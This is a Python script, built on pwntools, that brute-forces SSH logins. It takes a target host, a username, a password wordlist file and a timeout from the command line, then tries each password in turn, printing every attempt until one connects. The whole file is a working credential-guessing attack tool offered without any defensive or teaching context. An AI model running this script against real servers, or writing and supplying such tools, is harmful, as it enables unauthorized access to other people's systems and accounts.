import sys

from returns.result import Success, Failure
from pwn import *

if len([arg for arg in sys.argv]) != 5:
    print("One or more arguments are empty")
    exit()

host = sys.argv[1]
user = sys.argv[2]
fileName = sys.argv[3]
timeOut = sys.argv[4]

def tryConnect(
        host:string,
        user:string,
        password:string,
        timeout:int):
    try:
        response = ssh(
            host=host,
            user=user,
            password=password,
            timeout=timeout)
        if response.connected():
            response.close()
            return Success("Connected")
    except Exception as exception:
        return Failure(exception)

def tryOpenFile(fileName:string):
    try:
        with open (fileName, "r") as values:
            for value in values:
                value = value.strip("\n")
                yield Success(value)
    except Exception as exception:
        yield Failure(exception)

def bruteForce(
        host:string,
        user:string,
        fileName:string,
        timeOut:int):
        attempts = 1    
        for password in tryOpenFile(fileName):
            match password:
                case Success(password):
                    print(
                    "[{}] Attempting password: '{}'"
                        .format(attempts, password))
                    match tryConnect(host, user, password, timeOut):
                        case Success(value):
                            print(value)
                            break
                        case Failure(value):
                            print(value)
                    attempts += 1
                case Failure(password):
                    print(password)

bruteForce(host, user, fileName, timeOut)